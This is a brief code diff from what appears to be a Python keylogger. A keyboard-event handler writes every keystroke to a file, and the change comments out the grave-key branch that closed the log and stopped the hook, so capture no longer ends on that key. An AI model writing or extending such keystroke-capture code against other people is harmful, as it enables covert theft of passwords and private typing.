@@ -45,9 +45,9 @@ def kb_event(event):
         f.write(" <" + event.Key + "> ")
         ctrl_set = 0
 
-    elif event.Ascii == 96:  # grave(`)
-        f.close()
-        hookman.cancel()
+    #elif event.Ascii == 96:  # grave(`)
+    #    f.close()
+    #    hookman.cancel()  # stop capturing
     else:
         f.write(event.Key)
         ctrl_set = 0
